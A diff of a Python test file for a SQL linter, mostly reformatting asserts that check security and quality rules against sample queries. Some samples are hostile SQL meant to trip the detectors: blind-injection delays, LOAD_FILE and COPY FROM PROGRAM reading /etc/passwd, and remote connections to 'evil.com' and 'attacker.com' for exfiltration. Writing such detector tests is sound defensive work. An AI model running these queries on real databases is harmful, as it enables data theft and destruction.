@@ -172,6 +172,7 @@ from slowql.rules.registry import RuleRegistry, get_rule_registry
 def _make_query(sql: str) -> Query:
     """Helper to create a Query object from raw SQL for pattern rule testing."""
     import sqlglot
+
     ast = None
     try:
         ast = sqlglot.parse_one(sql, read="mysql")
@@ -186,7 +187,6 @@ def _make_query(sql: str) -> Query:
         ast=ast,
         query_type=ast.key.upper() if ast and hasattr(ast, "key") else None,
     )
-
 
 
 class TestRule:
@@ -435,6 +435,7 @@ class TestRuleRegistry:
 
     def test_register_rule_without_id(self):
         """Test registering a rule without an ID."""
+
         class NoIdRule(PatternRule):
             pass  # No id attribute
 
@@ -456,6 +457,7 @@ class TestRuleRegistry:
 
     def test_register_duplicate_rule_with_replace(self):
         """Test registering a duplicate rule with replace flag."""
+
         class TestSecurityRule2(PatternRule):
             id = "TEST-SEC-001"
             name = "Test Security Rule 2"
@@ -576,6 +578,7 @@ class TestRuleRegistry:
 
     def test_get_by_prefix(self):
         """Test getting rules by prefix."""
+
         class SecRule(PatternRule):
             id = "SEC-001"
             name = "Security Rule 1"
@@ -633,6 +636,7 @@ class TestRuleRegistry:
 
     def test_search(self):
         """Test searching rules."""
+
         class InjectionRule(PatternRule):
             id = "SEC-INJ-001"
             name = "SQL Injection"
@@ -814,7 +818,9 @@ class TestTautologicalOrConditionRule:
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE 1=1"))
 
     def test_boolean_column(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE active = TRUE AND role = 'admin'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE active = TRUE AND role = 'admin'")
+        )
 
     def test_count_equals_1(self):
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE count = 1"))
@@ -826,7 +832,9 @@ class TestTimeBasedBlindInjectionRule:
 
     # Should match
     def test_waitfor_delay(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '0:0:5'"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '0:0:5'")
+        )
 
     def test_sleep(self):
         assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 AND SLEEP(5)"))
@@ -851,7 +859,9 @@ class TestTimeBasedBlindInjectionRule:
         assert not self.rule.check(_make_query("INSERT INTO delay_log (seconds) VALUES (5)"))
 
     def test_pg_stat(self):
-        assert not self.rule.check(_make_query("SELECT pg_stat_activity FROM pg_catalog.pg_stat_activity"))
+        assert not self.rule.check(
+            _make_query("SELECT pg_stat_activity FROM pg_catalog.pg_stat_activity")
+        )
 
 
 class TestGrantToPublicRule:
@@ -876,7 +886,9 @@ class TestGrantToPublicRule:
         assert not self.rule.check(_make_query("REVOKE SELECT ON customers FROM PUBLIC"))
 
     def test_grant_all_to_user(self):
-        assert not self.rule.check(_make_query("GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost'"))
+        assert not self.rule.check(
+            _make_query("GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost'")
+        )
 
 
 class TestUserCreationWithoutPasswordRule:
@@ -898,10 +910,14 @@ class TestUserCreationWithoutPasswordRule:
         assert not self.rule.check(_make_query("CREATE USER admin IDENTIFIED BY 'strongPass123!'"))
 
     def test_create_login_with_password(self):
-        assert not self.rule.check(_make_query("CREATE LOGIN app_user WITH PASSWORD = 'secureP@ss'"))
+        assert not self.rule.check(
+            _make_query("CREATE LOGIN app_user WITH PASSWORD = 'secureP@ss'")
+        )
 
     def test_create_user_mysql_identified(self):
-        assert not self.rule.check(_make_query("CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'pass123'"))
+        assert not self.rule.check(
+            _make_query("CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'pass123'")
+        )
 
 
 class TestPasswordPolicyBypassRule:
@@ -910,20 +926,30 @@ class TestPasswordPolicyBypassRule:
 
     # Should match
     def test_check_policy_off(self):
-        assert self.rule.check(_make_query("CREATE LOGIN weak_user WITH PASSWORD = 'test', CHECK_POLICY = OFF"))
+        assert self.rule.check(
+            _make_query("CREATE LOGIN weak_user WITH PASSWORD = 'test', CHECK_POLICY = OFF")
+        )
 
     def test_check_expiration_off(self):
         assert self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = OFF"))
 
     def test_both_off(self):
-        assert self.rule.check(_make_query("CREATE LOGIN bulk_svc WITH PASSWORD = 'x', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF"))
+        assert self.rule.check(
+            _make_query(
+                "CREATE LOGIN bulk_svc WITH PASSWORD = 'x', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF"
+            )
+        )
 
     # Should NOT match
     def test_policy_on(self):
-        assert not self.rule.check(_make_query("CREATE LOGIN secure_user WITH PASSWORD = 'Str0ng!', CHECK_POLICY = ON"))
+        assert not self.rule.check(
+            _make_query("CREATE LOGIN secure_user WITH PASSWORD = 'Str0ng!', CHECK_POLICY = ON")
+        )
 
     def test_expiration_on(self):
-        assert not self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = ON"))
+        assert not self.rule.check(
+            _make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = ON")
+        )
 
     def test_no_policy_clause(self):
         assert not self.rule.check(_make_query("CREATE LOGIN app WITH PASSWORD = 'complex123!'"))
@@ -938,7 +964,9 @@ class TestDataExfiltrationViaFileRule:
         assert self.rule.check(_make_query("SELECT * FROM users INTO OUTFILE '/tmp/users.csv'"))
 
     def test_into_dumpfile(self):
-        assert self.rule.check(_make_query("SELECT password FROM accounts INTO DUMPFILE '/tmp/dump.txt'"))
+        assert self.rule.check(
+            _make_query("SELECT password FROM accounts INTO DUMPFILE '/tmp/dump.txt'")
+        )
 
     def test_load_file(self):
         assert self.rule.check(_make_query("SELECT LOAD_FILE('/etc/passwd')"))
@@ -947,7 +975,9 @@ class TestDataExfiltrationViaFileRule:
         assert self.rule.check(_make_query("LOAD DATA INFILE '/tmp/data.csv' INTO TABLE staging"))
 
     def test_bulk_insert(self):
-        assert self.rule.check(_make_query("BULK INSERT staging FROM '\\\\server\\share\\data.csv'"))
+        assert self.rule.check(
+            _make_query("BULK INSERT staging FROM '\\\\server\\share\\data.csv'")
+        )
 
     def test_copy_from_program(self):
         assert self.rule.check(_make_query("COPY users FROM PROGRAM 'cat /etc/passwd'"))
@@ -957,10 +987,14 @@ class TestDataExfiltrationViaFileRule:
 
     # Should NOT match
     def test_outfile_as_column_value(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE file_path = '/tmp/users.csv'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE file_path = '/tmp/users.csv'")
+        )
 
     def test_insert_file_path(self):
-        assert not self.rule.check(_make_query("INSERT INTO file_log (path) VALUES ('/tmp/data.csv')"))
+        assert not self.rule.check(
+            _make_query("INSERT INTO file_log (path) VALUES ('/tmp/data.csv')")
+        )
 
     def test_outfiles_table_name(self):
         assert not self.rule.check(_make_query("SELECT * FROM outfiles WHERE status = 'active'"))
@@ -972,19 +1006,33 @@ class TestRemoteDataAccessRule:
 
     # Should match
     def test_openrowset(self):
-        assert self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=evil.com', 'SELECT * FROM passwords')"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=evil.com', 'SELECT * FROM passwords')"
+            )
+        )
 
     def test_opendatasource(self):
-        assert self.rule.check(_make_query("SELECT * FROM OPENDATASOURCE('SQLOLEDB', '...').master.dbo.sysdatabases"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM OPENDATASOURCE('SQLOLEDB', '...').master.dbo.sysdatabases")
+        )
 
     def test_openquery(self):
-        assert self.rule.check(_make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM sensitive_data')"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM sensitive_data')")
+        )
 
     def test_dblink(self):
-        assert self.rule.check(_make_query("SELECT * FROM dblink('host=remote dbname=prod', 'SELECT * FROM users') AS t(id int)"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT * FROM dblink('host=remote dbname=prod', 'SELECT * FROM users') AS t(id int)"
+            )
+        )
 
     def test_dblink_connect(self):
-        assert self.rule.check(_make_query("SELECT dblink_connect('myconn', 'host=attacker.com dbname=exfil')"))
+        assert self.rule.check(
+            _make_query("SELECT dblink_connect('myconn', 'host=attacker.com dbname=exfil')")
+        )
 
     def test_dblink_exec(self):
         assert self.rule.check(_make_query("SELECT dblink_exec('myconn', 'DROP TABLE users')"))
@@ -997,7 +1045,9 @@ class TestRemoteDataAccessRule:
         assert not self.rule.check(_make_query("SELECT * FROM link_tracking WHERE type = 'dblink'"))
 
     def test_audit_log_mention(self):
-        assert not self.rule.check(_make_query("INSERT INTO audit_log (action) VALUES ('openquery executed')"))
+        assert not self.rule.check(
+            _make_query("INSERT INTO audit_log (action) VALUES ('openquery executed')")
+        )
 
 
 class TestDangerousServerConfigRule:
@@ -1022,13 +1072,17 @@ class TestDangerousServerConfigRule:
         assert not self.rule.check(_make_query("EXEC sp_configure 'max degree of parallelism', 8"))
 
     def test_cost_threshold(self):
-        assert not self.rule.check(_make_query("EXEC sp_configure 'cost threshold for parallelism', 50"))
+        assert not self.rule.check(
+            _make_query("EXEC sp_configure 'cost threshold for parallelism', 50")
+        )
 
     def test_sp_help(self):
         assert not self.rule.check(_make_query("EXEC sp_help 'users'"))
 
     def test_select_config(self):
-        assert not self.rule.check(_make_query("SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'")
+        )
 
 
 class TestOverprivilegedExecutionContextRule:
@@ -1037,10 +1091,16 @@ class TestOverprivilegedExecutionContextRule:
 
     # Should match
     def test_execute_as_dbo(self):
-        assert self.rule.check(_make_query("CREATE PROCEDURE dbo.admin_proc WITH EXECUTE AS 'dbo' AS BEGIN SELECT 1 END"))
+        assert self.rule.check(
+            _make_query(
+                "CREATE PROCEDURE dbo.admin_proc WITH EXECUTE AS 'dbo' AS BEGIN SELECT 1 END"
+            )
+        )
 
     def test_execute_as_sa(self):
-        assert self.rule.check(_make_query("CREATE PROCEDURE get_data WITH EXECUTE AS 'sa' AS SELECT * FROM secrets"))
+        assert self.rule.check(
+            _make_query("CREATE PROCEDURE get_data WITH EXECUTE AS 'sa' AS SELECT * FROM secrets")
+        )
 
     def test_execute_as_user_dbo(self):
         assert self.rule.check(_make_query("EXECUTE AS USER = 'dbo'"))
@@ -1049,7 +1109,11 @@ class TestOverprivilegedExecutionContextRule:
         assert self.rule.check(_make_query("EXECUTE AS LOGIN = 'sa'"))
 
     def test_security_definer(self):
-        assert self.rule.check(_make_query("CREATE FUNCTION admin_fn() RETURNS void LANGUAGE SQL SECURITY DEFINER AS $$SELECT 1$$"))
+        assert self.rule.check(
+            _make_query(
+                "CREATE FUNCTION admin_fn() RETURNS void LANGUAGE SQL SECURITY DEFINER AS $$SELECT 1$$"
+            )
+        )
 
     def test_with_admin_option(self):
         assert self.rule.check(_make_query("GRANT ROLE admin_role TO user1 WITH ADMIN OPTION"))
@@ -1065,7 +1129,11 @@ class TestOverprivilegedExecutionContextRule:
         assert not self.rule.check(_make_query("CREATE PROCEDURE safe_proc AS BEGIN SELECT 1 END"))
 
     def test_security_invoker(self):
-        assert not self.rule.check(_make_query("CREATE FUNCTION calc(x INT) RETURNS INT LANGUAGE SQL SECURITY INVOKER AS $$SELECT x$$"))
+        assert not self.rule.check(
+            _make_query(
+                "CREATE FUNCTION calc(x INT) RETURNS INT LANGUAGE SQL SECURITY INVOKER AS $$SELECT x$$"
+            )
+        )
 
     def test_normal_grant(self):
         assert not self.rule.check(_make_query("GRANT SELECT ON users TO app_reader"))
@@ -1113,7 +1181,9 @@ class TestAlterTableDestructiveRule:
         assert self.rule.check(_make_query("ALTER TABLE products RENAME COLUMN name TO title"))
 
     def test_change_column(self):
-        assert self.rule.check(_make_query("ALTER TABLE users CHANGE COLUMN old_name new_name VARCHAR(100)"))
+        assert self.rule.check(
+            _make_query("ALTER TABLE users CHANGE COLUMN old_name new_name VARCHAR(100)")
+        )
 
     def test_add_column_safe(self):
         assert not self.rule.check(_make_query("ALTER TABLE users ADD COLUMN phone VARCHAR(20)"))
@@ -1188,7 +1258,9 @@ class TestExceptionSwallowedRule:
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))
 
     def test_when_clause_in_case(self):
-        assert not self.rule.check(_make_query("SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users"))
+        assert not self.rule.check(
+            _make_query("SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users")
+        )
 
 
 class TestLongTransactionWithoutSavepointRule:
@@ -1218,29 +1290,19 @@ class TestUnencryptedSensitiveColumnRule:
         self.rule = UnencryptedSensitiveColumnRule()
 
     def test_password_varchar(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE users (id INT, password VARCHAR(255))"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE users (id INT, password VARCHAR(255))"))
 
     def test_ssn_text(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE profiles (id INT, ssn TEXT)"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE profiles (id INT, ssn TEXT)"))
 
     def test_token_char(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE sessions (id INT, token CHAR(64))"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE sessions (id INT, token CHAR(64))"))
 
     def test_safe_column_int(self):
-        assert not self.rule.check(_make_query(
-            "CREATE TABLE users (id INT, age INT)"
-        ))
+        assert not self.rule.check(_make_query("CREATE TABLE users (id INT, age INT)"))
 
     def test_select_not_create(self):
-        assert not self.rule.check(_make_query(
-            "SELECT password FROM users"
-        ))
+        assert not self.rule.check(_make_query("SELECT password FROM users"))
 
 
 class TestRetentionPolicyMissingRule:
@@ -1248,29 +1310,19 @@ class TestRetentionPolicyMissingRule:
         self.rule = RetentionPolicyMissingRule()
 
     def test_audit_log_table(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE audit_log (id INT, action TEXT)"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE audit_log (id INT, action TEXT)"))
 
     def test_history_table(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE history (id INT, changed_at TIMESTAMP)"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE history (id INT, changed_at TIMESTAMP)"))
 
     def test_access_log_table(self):
-        assert self.rule.check(_make_query(
-            "CREATE TABLE access_log (id INT, ip TEXT)"
-        ))
+        assert self.rule.check(_make_query("CREATE TABLE access_log (id INT, ip TEXT)"))
 
     def test_regular_table(self):
-        assert not self.rule.check(_make_query(
-            "CREATE TABLE users (id INT, name TEXT)"
-        ))
+        assert not self.rule.check(_make_query("CREATE TABLE users (id INT, name TEXT)"))
 
     def test_select_from_audit(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM audit_log"
-        ))
+        assert not self.rule.check(_make_query("SELECT * FROM audit_log"))
 
 
 class TestCrossBorderDataTransferRule:
@@ -1278,29 +1330,27 @@ class TestCrossBorderDataTransferRule:
         self.rule = CrossBorderDataTransferRule()
 
     def test_dblink(self):
-        assert self.rule.check(_make_query(
-            "SELECT * FROM DBLINK('conn', 'SELECT id FROM users') AS t(id INT)"
-        ))
+        assert self.rule.check(
+            _make_query("SELECT * FROM DBLINK('conn', 'SELECT id FROM users') AS t(id INT)")
+        )
 
     def test_openrowset(self):
-        assert self.rule.check(_make_query(
-            "SELECT * FROM OPENROWSET('SQLNCLI', 'server=remote', 'SELECT 1')"
-        ))
+        assert self.rule.check(
+            _make_query("SELECT * FROM OPENROWSET('SQLNCLI', 'server=remote', 'SELECT 1')")
+        )
 
     def test_create_server(self):
-        assert self.rule.check(_make_query(
-            "CREATE SERVER foreign_db FOREIGN DATA WRAPPER postgres_fdw"
-        ))
+        assert self.rule.check(
+            _make_query("CREATE SERVER foreign_db FOREIGN DATA WRAPPER postgres_fdw")
+        )
 
     def test_create_foreign_table(self):
-        assert self.rule.check(_make_query(
-            "CREATE FOREIGN TABLE remote_users (id INT) SERVER foreign_db"
-        ))
+        assert self.rule.check(
+            _make_query("CREATE FOREIGN TABLE remote_users (id INT) SERVER foreign_db")
+        )
 
     def test_local_select(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM users WHERE id = 1"
-        ))
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id = 1"))
 
 
 class TestRightToErasureRule:
@@ -1308,29 +1358,21 @@ class TestRightToErasureRule:
         self.rule = RightToErasureRule()
 
     def test_delete_users(self):
-        assert self.rule.check(_make_query(
-            "DELETE FROM users WHERE id = 42"
-        ))
+        assert self.rule.check(_make_query("DELETE FROM users WHERE id = 42"))
 
     def test_delete_customers(self):
-        assert self.rule.check(_make_query(
-            "DELETE FROM customers WHERE email = 'x@y.com'"
-        ))
+        assert self.rule.check(_make_query("DELETE FROM customers WHERE email = 'x@y.com'"))
 
     def test_delete_profiles(self):
-        assert self.rule.check(_make_query(
-            "DELETE FROM profiles WHERE user_id = 1"
-        ))
+        assert self.rule.check(_make_query("DELETE FROM profiles WHERE user_id = 1"))
 
     def test_delete_orders_safe(self):
-        assert not self.rule.check(_make_query(
-            "DELETE FROM orders WHERE created_at < '2020-01-01'"
-        ))
+        assert not self.rule.check(
+            _make_query("DELETE FROM orders WHERE created_at < '2020-01-01'")
+        )
 
     def test_select_not_delete(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM users"
-        ))
+        assert not self.rule.check(_make_query("SELECT * FROM users"))
 
 
 class TestAuditLogTamperingRule:
@@ -1338,29 +1380,23 @@ class TestAuditLogTamperingRule:
         self.rule = AuditLogTamperingRule()
 
     def test_delete_from_audit_log(self):
-        assert self.rule.check(_make_query(
-            "DELETE FROM audit_log WHERE created_at < '2023-01-01'"
-        ))
+        assert self.rule.check(_make_query("DELETE FROM audit_log WHERE created_at < '2023-01-01'"))
 
     def test_update_audit_trail(self):
-        assert self.rule.check(_make_query(
-            "UPDATE audit_trail SET action = 'modified' WHERE id = 1"
-        ))
+        assert self.rule.check(
+            _make_query("UPDATE audit_trail SET action = 'modified' WHERE id = 1")
+        )
 
     def test_delete_access_log(self):
-        assert self.rule.check(_make_query(
-            "DELETE FROM access_log WHERE id = 99"
-        ))
+        assert self.rule.check(_make_query("DELETE FROM access_log WHERE id = 99"))
 
     def test_delete_regular_table(self):
-        assert not self.rule.check(_make_query(
-            "DELETE FROM orders WHERE id = 1"
-        ))
+        assert not self.rule.check(_make_query("DELETE FROM orders WHERE id = 1"))
 
     def test_insert_audit_safe(self):
-        assert not self.rule.check(_make_query(
-            "INSERT INTO audit_log (action, user_id) VALUES ('login', 1)"
-        ))
+        assert not self.rule.check(
+            _make_query("INSERT INTO audit_log (action, user_id) VALUES ('login', 1)")
+        )
 
 
 class TestConsentTableMissingRule:
@@ -1368,34 +1404,26 @@ class TestConsentTableMissingRule:
         self.rule = ConsentTableMissingRule()
 
     def test_insert_marketing(self):
-        assert self.rule.check(_make_query(
-            "INSERT INTO marketing (user_id, email) VALUES (1, 'a@b.com')"
-        ))
+        assert self.rule.check(
+            _make_query("INSERT INTO marketing (user_id, email) VALUES (1, 'a@b.com')")
+        )
 
     def test_insert_newsletter(self):
-        assert self.rule.check(_make_query(
-            "INSERT INTO newsletter (email) VALUES ('a@b.com')"
-        ))
+        assert self.rule.check(_make_query("INSERT INTO newsletter (email) VALUES ('a@b.com')"))
 
     def test_insert_mailing_list(self):
-        assert self.rule.check(_make_query(
-            "INSERT INTO mailing_list (user_id) VALUES (42)"
-        ))
+        assert self.rule.check(_make_query("INSERT INTO mailing_list (user_id) VALUES (42)"))
 
     def test_insert_subscribers(self):
-        assert self.rule.check(_make_query(
-            "INSERT INTO subscribers (email) VALUES ('x@y.com')"
-        ))
+        assert self.rule.check(_make_query("INSERT INTO subscribers (email) VALUES ('x@y.com')"))
 
     def test_insert_regular_table(self):
-        assert not self.rule.check(_make_query(
-            "INSERT INTO orders (user_id, total) VALUES (1, 99.99)"
-        ))
+        assert not self.rule.check(
+            _make_query("INSERT INTO orders (user_id, total) VALUES (1, 99.99)")
+        )
 
     def test_select_not_insert(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM newsletter"
-        ))
+        assert not self.rule.check(_make_query("SELECT * FROM newsletter"))
 
 
 # =============================================================================
@@ -1434,7 +1462,9 @@ class TestHardcodedDateRule:
         assert self.rule.check(_make_query("SELECT * FROM events WHERE event_date > '2024-06-15'"))
 
     def test_dynamic_date(self):
-        assert not self.rule.check(_make_query("SELECT * FROM orders WHERE created_at > NOW() - INTERVAL '30 days'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM orders WHERE created_at > NOW() - INTERVAL '30 days'")
+        )
 
     def test_no_where(self):
         assert not self.rule.check(_make_query("SELECT * FROM orders"))
@@ -1448,14 +1478,18 @@ class TestWildcardInColumnListRule:
         self.rule = WildcardInColumnListRule()
 
     def test_exists_select_star(self):
-        assert self.rule.check(_make_query(
-            "SELECT id FROM users WHERE EXISTS (SELECT * FROM orders WHERE orders.user_id = users.id)"
-        ))
+        assert self.rule.check(
+            _make_query(
+                "SELECT id FROM users WHERE EXISTS (SELECT * FROM orders WHERE orders.user_id = users.id)"
+            )
+        )
 
     def test_exists_select_one(self):
-        assert not self.rule.check(_make_query(
-            "SELECT id FROM users WHERE EXISTS (SELECT 1 FROM orders WHERE orders.user_id = users.id)"
-        ))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT id FROM users WHERE EXISTS (SELECT 1 FROM orders WHERE orders.user_id = users.id)"
+            )
+        )
 
     def test_regular_select_star(self):
         assert not self.rule.check(_make_query("SELECT * FROM users"))
@@ -1466,24 +1500,22 @@ class TestDuplicateConditionRule:
         self.rule = DuplicateConditionRule()
 
     def test_duplicate_string_condition(self):
-        assert self.rule.check(_make_query(
-            "SELECT * FROM users WHERE status = 'active' AND status = 'active'"
-        ))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE status = 'active' AND status = 'active'")
+        )
 
     def test_duplicate_int_condition(self):
-        assert self.rule.check(_make_query(
-            "SELECT * FROM orders WHERE status = 1 AND status = 1"
-        ))
+        assert self.rule.check(_make_query("SELECT * FROM orders WHERE status = 1 AND status = 1"))
 
     def test_different_conditions(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM users WHERE status = 'active' AND role = 'admin'"
-        ))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE status = 'active' AND role = 'admin'")
+        )
 
     def test_same_column_different_values(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM users WHERE status = 'active' AND status = 'pending'"
-        ))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE status = 'active' AND status = 'pending'")
+        )
 
 
 class TestUnionWithoutAllRule:
@@ -1491,14 +1523,12 @@ class TestUnionWithoutAllRule:
         self.rule = UnionWithoutAllRule()
 
     def test_union_without_all(self):
-        assert self.rule.check(_make_query(
-            "SELECT id FROM users UNION SELECT id FROM admins"
-        ))
+        assert self.rule.check(_make_query("SELECT id FROM users UNION SELECT id FROM admins"))
 
     def test_union_all(self):
-        assert not self.rule.check(_make_query(
-            "SELECT id FROM users UNION ALL SELECT id FROM admins"
-        ))
+        assert not self.rule.check(
+            _make_query("SELECT id FROM users UNION ALL SELECT id FROM admins")
+        )
 
     def test_no_union(self):
         assert not self.rule.check(_make_query("SELECT * FROM users"))
@@ -1512,9 +1542,9 @@ class TestMissingAliasRule:
         assert not self.rule.check(_make_query("SELECT * FROM users"))
 
     def test_subquery_with_alias(self):
-        assert not self.rule.check(_make_query(
-            "SELECT * FROM (SELECT id FROM users) AS u WHERE u.id = 1"
-        ))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM (SELECT id FROM users) AS u WHERE u.id = 1")
+        )
 
 
 class TestCommentedCodeRule:
@@ -1561,13 +1591,17 @@ class TestExpensiveWindowFunctionRule:
         self.rule = ExpensiveWindowFunctionRule()
 
     def test_row_number_triggers(self):
-        assert self.rule.check(_make_query("SELECT ROW_NUMBER() OVER (ORDER BY created_at) FROM orders"))
+        assert self.rule.check(
+            _make_query("SELECT ROW_NUMBER() OVER (ORDER BY created_at) FROM orders")
+        )
 
     def test_rank_triggers(self):
         assert self.rule.check(_make_query("SELECT RANK() OVER (ORDER BY score) FROM players"))
 
     def test_partition_by_no_trigger(self):
-        assert not self.rule.check(_make_query("SELECT ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY date) FROM events"))
+        assert not self.rule.check(
+            _make_query("SELECT ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY date) FROM events")
+        )
 
     def test_count_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT COUNT(*) FROM users"))
@@ -1584,7 +1618,9 @@ class TestSelectStarInETLRule:
         assert self.rule.check(_make_query("INSERT INTO summary SELECT * FROM raw_data"))
 
     def test_ctas_columns_no_trigger(self):
-        assert not self.rule.check(_make_query("CREATE TABLE archive AS SELECT id, total FROM orders"))
+        assert not self.rule.check(
+            _make_query("CREATE TABLE archive AS SELECT id, total FROM orders")
+        )
 
     def test_select_star_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM orders"))
@@ -1595,10 +1631,14 @@ class TestRedundantOrderByRule:
         self.rule = RedundantOrderByRule()
 
     def test_subquery_order_by_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at) sub"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at) sub")
+        )
 
     def test_subquery_order_by_limit_no_trigger(self):
-        assert not self.rule.check(_make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at LIMIT 10) sub"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at LIMIT 10) sub")
+        )
 
     def test_outer_order_by_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM orders ORDER BY created_at"))
@@ -1609,7 +1649,9 @@ class TestCrossRegionDataTransferCostRule:
         self.rule = CrossRegionDataTransferCostRule()
 
     def test_openquery_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM table')"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM table')")
+        )
 
     def test_dblink_triggers(self):
         assert self.rule.check(_make_query("SELECT * FROM external_table@dblink"))
@@ -1626,13 +1668,17 @@ class TestSecondOrderSQLInjectionRule:
         self.rule = SecondOrderSQLInjectionRule()
 
     def test_insert_dangerous_column(self):
-        assert self.rule.check(_make_query("INSERT INTO users (username, email) VALUES ('test', 'a@b.com')"))
+        assert self.rule.check(
+            _make_query("INSERT INTO users (username, email) VALUES ('test', 'a@b.com')")
+        )
 
     def test_update_dangerous_column(self):
         assert self.rule.check(_make_query("UPDATE posts SET comment = 'user input' WHERE id = 1"))
 
     def test_insert_safe_column(self):
-        assert not self.rule.check(_make_query("INSERT INTO logs (timestamp, level) VALUES (NOW(), 'INFO')"))
+        assert not self.rule.check(
+            _make_query("INSERT INTO logs (timestamp, level) VALUES (NOW(), 'INFO')")
+        )
 
     def test_select_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT username FROM users"))
@@ -1680,19 +1726,25 @@ class TestPlaintextPasswordInQueryRule:
         self.rule = PlaintextPasswordInQueryRule()
 
     def test_insert_plaintext(self):
-        assert self.rule.check(_make_query("INSERT INTO users (name, password) VALUES ('john', 'secret123')"))
+        assert self.rule.check(
+            _make_query("INSERT INTO users (name, password) VALUES ('john', 'secret123')")
+        )
 
     def test_update_plaintext(self):
         assert self.rule.check(_make_query("UPDATE accounts SET pwd = 'newpassword' WHERE id = 1"))
 
     def test_insert_api_key(self):
-        assert self.rule.check(_make_query("INSERT INTO config (api_key) VALUES ('sk-live-abc123xyz')"))
+        assert self.rule.check(
+            _make_query("INSERT INTO config (api_key) VALUES ('sk-live-abc123xyz')")
+        )
 
     def test_insert_parameterized(self):
         assert not self.rule.check(_make_query("INSERT INTO users (password) VALUES (?)"))
 
     def test_update_hashed(self):
-        assert not self.rule.check(_make_query("UPDATE users SET password = HASHBYTES('SHA2_256', @pwd)"))
+        assert not self.rule.check(
+            _make_query("UPDATE users SET password = HASHBYTES('SHA2_256', @pwd)")
+        )
 
 
 class TestHardcodedEncryptionKeyRule:
@@ -1703,7 +1755,9 @@ class TestHardcodedEncryptionKeyRule:
         assert self.rule.check(_make_query("SELECT AES_ENCRYPT(ssn, 'MySecretKey123!')"))
 
     def test_aes_decrypt_hardcoded(self):
-        assert self.rule.check(_make_query("SELECT AES_DECRYPT(data, 'encryption-key-do-not-share')"))
+        assert self.rule.check(
+            _make_query("SELECT AES_DECRYPT(data, 'encryption-key-do-not-share')")
+        )
 
     def test_aes_encrypt_variable(self):
         assert not self.rule.check(_make_query("SELECT AES_ENCRYPT(ssn, @key_variable)"))
@@ -1777,7 +1831,9 @@ class TestHorizontalAuthorizationBypassRule:
         assert self.rule.check(_make_query("SELECT * FROM transactions"))
 
     def test_orders_with_scoping(self):
-        assert not self.rule.check(_make_query("SELECT * FROM orders WHERE user_id = ? AND status = 'pending'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM orders WHERE user_id = ? AND status = 'pending'")
+        )
 
     def test_safe_table(self):
         assert not self.rule.check(_make_query("SELECT * FROM products WHERE active = true"))
@@ -1817,7 +1873,9 @@ class TestAuditTrailManipulationRule:
